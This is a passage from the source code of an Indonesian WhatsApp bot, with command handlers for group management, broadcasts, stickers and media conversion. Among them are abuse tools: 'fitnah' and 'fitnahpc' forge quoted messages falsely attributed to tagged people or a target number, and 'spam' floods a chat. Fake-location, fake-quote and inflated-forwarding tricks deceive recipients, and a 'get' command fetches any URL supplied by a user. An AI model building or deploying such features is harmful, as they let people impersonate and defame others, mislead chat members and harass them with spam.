        	var ini_gopayy =`Halo @${sender.split("@")[0]} Gunakan ${prefix + command } Open / Close jika button tidak merespon`
var buttonss = [
{buttonId: 'group open', buttonText:{displayText: 'Open'}, type: 1},
{buttonId: 'group close', buttonText:{displayText: 'Close'}, type: 1}
]

buttonMessagee = {
contentText: ini_gopayy,
footerText: `${tampilTanggal}\n${tampilWaktu}\n\n© ${creator}` ,
buttons: buttonss,
headerType: 1
}
alpha.sendMessage(from,  buttonMessagee, MessageType.buttonsMessage,{
        caption: 'Botwea ©2k21',
        "contextInfo": {
            text: 'hi',
            "forwardingScore": 1000000000,
            isForwarded: true,
            sendEphemeral: true,
            "mentionedJid" : [sender]
            },
			quoted: ftroli,sendEphemeral: true 
			})
        }
        break
            case 'mystat': 
            case 'botstat': 
            case 'botstatus': 
			case 'mystatus':
				anu = process.uptime()
                teskny = `B O T  S T A T I S T I C\n`
				teskny +=`\`\`\`Group Chat : ${giid.length}\`\`\`\n`
				teskny +=`\`\`\`Personal Chat : ${totalchat.length - giid.length}\`\`\`\n`
				teskny +=`\`\`\`Total Chat : ${totalchat.length}\`\`\`\n`
				teskny +=`\`\`\`Speed :\`\`\` ${latensii.toFixed(4)} _Second_\n`
				teskny +=`\`\`\`Runtime : ${(kyun(os.uptime()))}\`\`\`\n\n` 
				teskny +=`P H O N E  S T A T I S T I C\n`
				teskny +=`\`\`\`Wa Whatsapp : ${wa_version}\`\`\`\n`
				teskny +=`\`\`\`RAM : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB\`\`\`\n`
				teskny +=`\`\`\`MCC : ${mcc}\`\`\`\n`
				teskny +=`\`\`\`MNC : ${mnc}\`\`\`\n`
				teskny +=`\`\`\`OS Version : ${os_version}\`\`\`\n`
				teskny +=`\`\`\`Merk Hp : ${device_manufacturer}\`\`\`\n`
				teskny +=`\`\`\`Versi Hp : ${device_model}\`\`\`\n`
				teskny +=`\`\`\`Runtime : ${(kyun(os.uptime()))}\`\`\``
				alpha.sendMessage(from, teskny, text, {quoted: { key : { participant : `0@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumbnail}`), "mimetype": "application/octet-stream","title": `${setting.fake}`, "fileLength": "36", "pageCount": 0, "fileName": `${setting.fake}`}}, "messageTimestamp": "1614069378", "status": "PENDING"},contextInfo:{"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
break
case 'getbio':
				if (!isGroup) return reply(lang.onlygc())
				if (args.length < 1) return reply('```TAG ORANGNYA```')
                mentionedd = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
                const p = await alpha.getStatus(`${mentionedd}`, MessageType.text)
                reply(p.status)
                if (p.status == 401) {
                reply("Error! mungkin diprivate")
                }
                await limitAdd(sender, limit)
                break
/*case 'creategroup':
case 'creategrup':
			    if (!isGroup) return reply(lang.onlygc())
				if (args.length < 1) return reply(`Penggunaan ${prefix}creategrup nama grup|@tag member`)
				argza = arg.split('|')
				if (mek.message.extendedTextMessage != undefined){
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
                    for (let i = 0; i < mentioned.length; i++){
						anu = []
						anu.push(mentioned[i])
                    }
					alpha.groupCreate(argza[0], anu)
					reply(`Sukes membuat grup:\n${argza}`)
                }
				break*/
		case 'caripesan':
		    case 'searchmessage':
		if (isLimit(sender, isPremium, isCreator, isOwner, limitawal, limit)) return sendButMessage(from, lang.limit(prefix), `© ${ownername}`, [{buttonId: 'limit', buttonText: {displayText: `Check Limit`, },type: 1,}]);
				if (!q) return reply(`Penggunaan ${command} _nama pesannya_\n\nContoh \n --> ${command} halo`)
				reply(lang.wait())
				 xtext = args.join(' ')
				                cond = xtext.split(" ")
				                 a = await alpha.searchMessages(xtext, from, 10, 1)// count 10 
				                 fox = '*「 Message Search 」*\n\n'
				                num = 0
				                for (j of a.messages){
				                    num += 1
				                    if (j.message.conversation) {
				                        if (j.key.fromMe){ 
				                            fox += num+'. Sender : '+alpha.user.jid+'\n    Msg : '+j.message.conversation+'\n    MsgID : '+j.key.id+'\n    Type : conversation\n\n'
				                        }else{
				                            fox += num+'. Sender : '+j.key.participant+'\n    Msg : '+j.message.conversation+'\n    MsgID : '+j.key.id+'\n    Type : conversation\n\n'
				                        } 
				                    }
				                    else if (j.message.extendedTextMessage){
				                        if (j.key.fromMe){ 
				                            fox += num+'. Sender : '+alpha.user.jid+'\n    Msg : '+j.message.extendedTextMessage.text+'\n    MsgID : '+j.key.id+'\n    Type : extendedTextMessage\n\n'
				                        }else{
				                            fox += num+'. Sender : '+j.key.participant+'\n    Msg : '+j.message.extendedTextMessage.text+'\n    MsgID : '+j.key.id+'\n    Type : extendedTextMessage\n\n'
				                        } 
				                    }
				                }
				                reply(fox)
				await limitAdd(sender, limit)
		                break
case 'setname':
					if (!isGroup) return reply(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					if (!isBotGroupAdmins) return reply(lang.botNotAdm())
					alpha.groupUpdateSubject(from, `${body.slice(9)}`)
					alpha.sendMessage(from, '「  SUKSES  」Mengubah Nama Grup', text, { quoted: fdoc })
					await limitAdd(sender, limit)
					break 
case 'setdesc':
					if (!isGroup) return reply(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					if (!isBotGroupAdmins) return reply(lang.botNotAdm())
					alpha.groupUpdateDescription(from, `${body.slice(9)}`)
					alpha.sendMessage(from, '*「  SUKSES  」Mengubah Desk Grup', text, { quoted: fdoc })
					await limitAdd(sender, limit)
					break   
case 'spam':
if (!isGroup) return reply(lang.onlygc())
				if (!isGroupAdmins) return reply(lang.onlygcAdmin())
				if (args.length < 1) return reply(`Penggunaan ${prefix}spam teks|jumlahspam`)
				argzi = args.split("|")
				if (!argzi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				if (isNaN(argzi[1])) return reply(`harus berupa angka`)
				for (let i = 0; i < argzi[1]; i++){
					alpha.sendMessage(from, argzi[0], MessageType.text)
				}
				await limitAdd(sender, limit)
					break    
case 'readall':
					if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					var chats = await alpha.chats.all()
                    chats.map( async ({ jid }) => {
                          await alpha.chatRead(jid)
                    })
					rdl = `Berhasil membaca ${chats.length} Chat !`
					reply(rdl)
					console.log(chats.length)
					break
case 'listpc':
					  if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					  cpcp = await getpc(totalchat)
					  teks = `*L I S T  P E R S O N A L  C H A T*\nTOTAL PC: ${cpcp.length}\n\n`
					  for(let i=0; i<cpcp.length; i++){
						conts = mek.key.fromMe ? mek.user.jid : alpha.contacts[cpcp[i]] || {notify: jid.replace(/@.+/, '')}
						pushnama = alpha.contacts[cpcp[i]] != undefined ? alpha.contacts[cpcp[i]].vname || alpha.contacts[cpcp[i]].notify : undefined
						teks += `• Name : ${pushnama}\n• Tag : @${cpcp[i].split("@")[0]}\n• Wa.me : wa.me/${cpcp[i].split("@")[0]}\n\n----------------------------------\n\n`
					}
					mentions( teks, cpcp, true)
					break 
case 'listgroup':
case 'listgrup':
case 'listgc':
case 'listgrop':
case 'gruplist':
case 'groplist':
case 'grouplist':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
const txs = alpha.chats.all().filter(v => v.jid.endsWith('g.us')).map(v =>`•> ${alpha.getName(v.jid)}${enter}${v.jid}\n[${v.read_only ? 'Left' : 'Joined'}]`).join`${enter}~~${enter}`
alpha.sendMessage(m.chat, '```「 LIST GROUPS 」```\n\n' + txs, text)
break
				   break 
case 'bcsticker':
case 'bcstik':
					if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					anu = await alpha.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await alpha.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							alpha.sendMessage(_.jid, bc, sticker, {quoted:ftroli})
						}
						fakestatus('Suksess broadcast')
					}
					break
case 'bcvideo':
					if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					anu = await alpha.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await alpha.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							alpha.sendMessage(_.jid, bc, video, {mimetype: 'video/mp4', duration: 359996400,quoted: ftoko,caption: `[ *${setting.botname} BROADCAST* ]\n\n${body.slice(9)}`})
						}
						fakestatus(lang.successBc())
					}
					break
	case 'bcaudio':
					if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					anu = await alpha.chats.all()
					if (isMedia && !mek.message.audioMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await alpha.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							alpha.sendMessage(_.jid, bc, audio, {mimetype :  'audio/mp4' , duration : 359996400, ptt : true,quoted: ftoko,caption: `[ *${setting.botname} BROADCAST* ]\n\n${body.slice(9)}`})
						}
						fakestatus(lang.successBc())
					}
					break
case 'bcgif':
					if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					anu = await alpha.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await alpha.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							alpha.sendMessage(_.jid, bc, sticker, {mimetype: Mimetype.gif,quoted : ftroli,caption: `[ *${setting.botname} BROADCAST* ]\n\n${body.slice(7)}`})
						}
						fakestatus(lang.successBc())
					}
					break
         case 'owner':
         case 'creator':  
         ini_ownerNumber = [`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`]
					let ini_list = []
					for (let i of ini_ownerNumber) {
					const vname = alpha.contacts[i] != undefined ? alpha.contacts[i].vname || alpha.contacts[i].notify : undefined
					ini_list.push({
					"displayName": 'Owner Alphabot',
					"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname ? `${vname}` : `${alpha.user.name}`}\nORG: SUBSCRIBE ZEEONE OFC;\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
					})
					}
					hehe = await alpha.sendMessage(from, {
					"displayName": `${ini_list.length} kontak`,
					"contacts": ini_list 
					}, 'contactsArrayMessage', { quoted: fkontak})
					var ini_gopayy =`Halo @${sender.split("@")[0]} itu owner ku, jangan lupa donasi kak😇`
var buttonss = [
{buttonId: 'donasi', buttonText:{displayText: 'Donasi'}, type: 1},
{buttonId: 'sewabot', buttonText:{displayText: 'Sewa'}, type: 1}
]

buttonMessagee = {
contentText: ini_gopayy,
footerText: `${tampilTanggal}\n${tampilWaktu}\n\n© ${creator}` ,
buttons: buttonss,
headerType: 1
}
alpha.sendMessage(from,  buttonMessagee, MessageType.buttonsMessage,{
        caption: 'Botwea ©2k21',
        "contextInfo": {
            text: 'hi',
            "forwardingScore": 1000000000,
            isForwarded: true,
            sendEphemeral: true,
            "mentionedJid" : [sender]
            },
			quoted: ftoko,sendEphemeral: true 
			})
					break
                case 'sider':
                shape = '✓ '
infom = await alpha.messageInfo(from, mek.message.extendedTextMessage.contextInfo.stanzaId)
tagg = []
teks = `Telah Dibaca Oleh :\n\n`
for(let i of infom.reads){
teks += shape+' ' + '@' + i.jid.split('@')[0] + '\n'
teks += `> Waktu : ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
tagg.push(i.jid)
}
mentions(teks, tagg, true)
await limitAdd(sender, limit)
					break   
			case 'fakeloc':
			if (isLimit(sender, isPremium, isCreator, isOwner, limitawal, limit)) return sendButMessage(from, lang.limit(prefix), `© ${ownername}`, [{buttonId: 'limit', buttonText: {displayText: `Check Limit`, },type: 1,}]);
               var kntl = body.slice(8)
			   var nama = kntl.split("|")[0];
			   var impostor = kntl.split("|")[1];
			   var bro = fs.readFileSync(`image/${thumbnail}`)
               alpha.sendMessage(from, { name: `${nama}`,address: `${impostor}`,jpegThumbnail: bro }, MessageType.location)                
		    await limitAdd(sender, limit)
					break   
		    case 'on':
		            if (!mek.key.fromMe && !isOwner && !isCreator) return 
		            offline = false
		            fakeitem(lang.ownerOn())
		            break       
		    case 'status':
		            fakeitem(`*STATUS*\n${offline ? '> OFFLINE' : '> ONLINE'}\n${banChats ? '> SELF-MODE' : '> PUBLIC-MODE'}`)
		            break
		    case 'off':
		            if (!mek.key.fromMe && !isOwner && !isCreator) return 
		            offline = true
		            waktu = Date.now()
		            anuu = args.join(' ') ? args.join(' ') : '-'
		            alasan = anuu
		            fakeitem(lang.ownerOff())
		            break   
		    case 'get':
		if (isLimit(sender, isPremium, isCreator, isOwner, limitawal, limit)) return sendButMessage(from, lang.limit(prefix), `© ${ownername}`, [{buttonId: 'limit', buttonText: {displayText: `Check Limit`, },type: 1,}]);
		            if(!q) return reply('linknya?')
		            fetch(`${args[0]}`).then(res => res.text())  
		            .then(bu =>{
		            fakestatus(bu)
		            })   
		            await limitAdd(sender, limit)
					break   
		    case 'kontag':
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					if (!isOwner && !isCreator) return reply(lang.onlyOwner())
		            pe = args.join('')
		            entah = pe.split('|')[0]
		            nah = pe.split('|')[1]
		            if (isNaN(entah)) return reply('Invalid phone number');
		            members_ids = []
		            for (let mem of groupMembers) {
		            members_ids.push(mem.jid)
		            }
		            vcard = 'BEGIN:VCARD\n'
		            + 'VERSION:3.0\n'
		            + `FN:${nah}\n`
		            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
		            + 'END:VCARD'.trim()
		            alpha.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact, {contextInfo: {"mentionedJid": members_ids}})
		            await limitAdd(sender, limit)
					break   
		    case 'sticktag':
		            if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					if (!isOwner && !isCreator) return reply(lang.onlyOwner())
		            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
		            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, sticker, options)
		            fs.unlinkSync(file)
		            } else {
		            fakegroup(`*Reply sticker yang sudah dikirim*`)
		            }
		            await limitAdd(sender, limit)
					break   
		    case 'totag':
		            if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					if (!isOwner && !isCreator) return reply(lang.onlyOwner())
		            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
		            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, sticker, options)
		            fs.unlinkSync(file)
		            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
		            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, image, options)
		            fs.unlinkSync(file)
		        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
		            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		            	mimetype : 'audio/mp4',
		            	ptt : true,
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, audio, options)
		            fs.unlinkSync(file)
		        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
		            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		            	mimetype : 'video/mp4',
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, video, options)
		            fs.unlinkSync(file)
		        } else{
		          fakestatus(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
		        }
		        await limitAdd(sender, limit)
					break   
		    case 'fitnah':
		if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
		            if (args.length < 1) return fakegroup(`Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
		            var gh = args.join('')
		            mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
		            var replace = gh.split("|")[0];
		            var target = gh.split("|")[1];
		            var bot = gh.split("|")[2];
		            alpha.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
		            break
		    case 'settarget':
		if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
		            if(!q) return fakegroup(`${prefix}settarget 628xxxxx`)
		            targetpc = args[0]
		            fakegroup(`Succes Mengganti target fitnahpc : ${targetpc}`)
		            break
		    case 'fitnahpc':
		if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
		            if(!q) return fakegroup(`${prefix}fitnahpc teks target|teksny`)
		            jids = `${targetpc}@s.whatsapp.net` // nomer target
		            var splitt = args.join(' ').replace(/@|\d/gi, '').split('|')
		            var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
		            var options = {contextInfo: {quotedMessage: {extendedTextMessage: {text: splitt[0]}}}}
		            const responye = await alpha.sendMessage(jids, `${splitt[1]}`, MessageType.text, options)
		            await alpha.deleteMessage(jids, { id: responye.messageID, remoteJid: jids, fromMe: true })
		            break
		    case 'tomp3':
		if (isLimit(sender, isPremium, isCreator, isOwner, limitawal, limit)) return sendButMessage(from, lang.limit(prefix), `© ${ownername}`, [{buttonId: 'limit', buttonText: {displayText: `Check Limit`, },type: 1,}]);
		            if (!isQuotedVideo) return fakegroup('```Reply videonya!```')
		            reply(mess.wait)
		            let encmedia2 = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		            let media2 = await alpha.downloadAndSaveMediaMessage(encmedia2)
		            ran = getRandom('.mp4')
		            exec(`ffmpeg -i ${media2} ${ran}`, (err) => {
		            fs.unlinkSync(media2)
		            if (err) return fakegroup(`Err: ${err}`)
		            buffer453 = fs.readFileSync(ran)
		            alpha.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', quoted: mek })
		            fs.unlinkSync(ran)
		            })
		            await limitAdd(sender, limit)
					break   
		    case 'fast':
		if (isLimit(sender, isPremium, isCreator, isOwner, limitawal, limit)) return sendButMessage(from, lang.limit(prefix), `© ${ownername}`, [{buttonId: 'limit', buttonText: {displayText: `Check Limit`, },type: 1,}]);
		            if (!isQuotedVideo) return fakegroup('Reply videonya!')
		            fakegroup(mess.wait)
		            encmedia3 = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		            media3 = await alpha.downloadAndSaveMediaMessage(encmedia3)
		            ran = getRandom('.mp4')
		            exec(`ffmpeg -i ${media3} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
		            fs.unlinkSync(media3)
		            if (err) return fakegroup(`Err: ${err}`)
		            buffer453 = fs.readFileSync(ran)
		            alpha.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
		            fs.unlinkSync(ran)
		            })
		            await limitAdd(sender, limit)
					break   
		    case 'slow':
		if (isLimit(sender, isPremium, isCreator, isOwner, limitawal, limit)) return sendButMessage(from, lang.limit(prefix), `© ${ownername}`, [{buttonId: 'limit', buttonText: {displayText: `Check Limit`, },type: 1,}]);
		            if (!isQuotedVideo) return fakegroup('Reply videonya!')
		            fakegroup(mess.wait)
		            encmedia4 = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		            media4 = await alpha.downloadAndSaveMediaMessage(encmedia4)
		            ran = getRandom('.mp4')
		            exec(`ffmpeg -i ${media4} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
		            fs.unlinkSync(media4)
		            if (err) return fakegroup(`Err: ${err}`)
		            buffer453 = fs.readFileSync(ran)
		            alpha.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
		            fs.unlinkSync(ran)
		            })
		            await limitAdd(sender, limit)
					break   
		case 'tupai':
		if (isLimit(sender, isPremium, isCreator, isOwner, limitawal, limit)) return sendButMessage(from, lang.limit(prefix), `© ${ownername}`, [{buttonId: 'limit', buttonText: {displayText: `Check Limit`, },type: 1,}]);
var encmedia6 = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
var media6 = await alpha.downloadAndSaveMediaMessage(encmedia6)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media6} -filter:a "atempo=0.5,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media6)
if (err) return reply('Error!')
let hah = fs.readFileSync(ran)
alpha.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
await limitAdd(sender, limit)
					break   
		    case 'reverse':
		if (isLimit(sender, isPremium, isCreator, isOwner, limitawal, limit)) return sendButMessage(from, lang.limit(prefix), `© ${ownername}`, [{buttonId: 'limit', buttonText: {displayText: `Check Limit`, },type: 1,}]);
		            if (!isQuotedVideo) return fakegroup('```Reply videonya!```')
		           var encmedia5 = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		          var media5 = await alpha.downloadAndSaveMediaMessage(encmedia5)
		            ran = getRandom('.mp4')
		            exec(`ffmpeg -i ${media5} -vf reverse -af areverse ${ran}`, (err) => {
		            fs.unlinkSync(media5)
		            if (err) return fakegroup(`Err: ${err}`)
		            buffer453 = fs.readFileSync(ran)
		            alpha.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
		            fs.unlinkSync(ran)
		            })
		            await limitAdd(sender, limit)
					break   
		    case 'anime2':
					if (isLimit(sender, isPremium, isCreator, isOwner, limitawal, limit)) return sendButMessage(from, lang.limit(prefix), `© ${ownername}`, [{buttonId: 'limit', buttonText: {displayText: `Check Limit`, },type: 1,}]);
		            fetch('https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt')
		            .then(res => res.text())
		            .then(body => {
		            let tod = body.split("\n");
		            let pjr = tod[Math.floor(Math.random() * tod.length)];
		            imageToBase64(pjr)
		            .then((response) => {
		            media =  Buffer.from(response, 'base64');
		            alpha.sendMessage(from,media,image,{quoted:mek,caption:'Dasar wibu. Nih!!!\nJgn lupa sub YT : ZEEONE OFC'})
		            }
		            )
		            .catch((error) => {
		            console.log(error); 
		            }
		            )
		            });
		            await limitAdd(sender, limit)
					break   
		    case 'kontak':
		if (isLimit(sender, isPremium, isCreator, isOwner, limitawal, limit)) return sendButMessage(from, lang.limit(prefix), `© ${ownername}`, [{buttonId: 'limit', buttonText: {displayText: `Check Limit`, },type: 1,}]);
		            pe = args.join(' ') 
		            entah = pe.split('|')[0]
		            nah = pe.split('|')[1]
		            if (isNaN(entah)) return reply('Invalid phone number');
		            vcard = 'BEGIN:VCARD\n'
		            + 'VERSION:3.0\n'
		            + `FN:${nah}\n`
		            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
		            + 'END:VCARD'.trim()
		            alpha.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact)
		            await limitAdd(sender, limit)
					break   
		    case 'take':
		    case 'colong':
		if (!isPremium) return sendButMessage(from, `Mohon maaf fitur ini khusus untuk user premium saja! Upgrade akun mu sekarang dengan cara ketik ${prefix}goprem`, `Click button below`, [{buttonId: 'goprem',buttonText: {displayText: `Upgrade Premium`,},type: 1,}],{quoted:mek});
		if (!isQuotedSticker) return reply('```Reply stc nya```')
		            var encmedia_ = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
				    var media_ = await alpha.downloadAndSaveMediaMessage(encmedia_)
		            anu = args.join(' ').split('|')
		            satu = anu[0] !== '' ? anu[0] : `SUBSCRIBE`
		            dua = typeof anu[1] !== 'undefined' ? anu[1] : `ZEEONE OFC`
		            require('./lib/fetcher.js').createExif(satu, dua)
					require('./lib/fetcher.js').modStick(media_ , alpha, mek, from)
					await limitAdd(sender, limit)
					break   
			case 'stikerwm':
			case 'stickerwm':
		    case 'swm':
		if (!isPremium) return sendButMessage(from, `Mohon maaf fitur ini khusus untuk user premium saja! Upgrade akun mu sekarang dengan cara ketik ${prefix}goprem`, `Click button below`, [{buttonId: 'goprem',buttonText: {displayText: `Upgrade Premium`,},type: 1,}],{quoted:mek});
		            pe = args.join('')
		            var a = pe.split("|")[0];
		            var b = pe.split("|")[1];
		            if (isMedia && !mek.message.videoMessage || isQuotedImage ) {
		            const encmedia___ = isQuotedImage   ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
		             media___ = await alpha.downloadAndSaveMediaMessage(encmedia___)
		            await createExif(a,b)
		            out = getRandom('.webp')
		            ffmpeg(media___)
		            .on('error', (e) => {
		            console.log(e)
		            alpha.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
		            fs.unlinkSync(media___)
		            })
		            .on('end', () => {
		            _out = getRandom('.webp')
		            spawn('webpmux', ['-set','exif','./sticker/data.exif', out, '-o', _out])
		            .on('exit', () => {
		            alpha.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
		            fs.unlinkSync(out)
		            fs.unlinkSync(_out)
		            fs.unlinkSync(media___)
		            })
		            })
		            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
		            .toFormat('webp')
		            .save(out) 
		            } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
		            const encmedia___ = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
		            const media___ = await alpha.downloadAndSaveMediaMessage(encmedia___)
		            pe = args.join('')
		            var a = pe.split("|")[0];
		            var b = pe.split("|")[1];
		            await createExif(a,b)
		            out = getRandom('.webp')
		            ffmpeg(media___)
		            .on('error', (e) => {
		            console.log(e)
		            alpha.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
		            fs.unlinkSync(media___)
		            })
		            .on('end', () => {
		            _out = getRandom('.webp')
		            spawn('webpmux', ['-set','exif','./sticker/data.exif', out, '-o', _out])
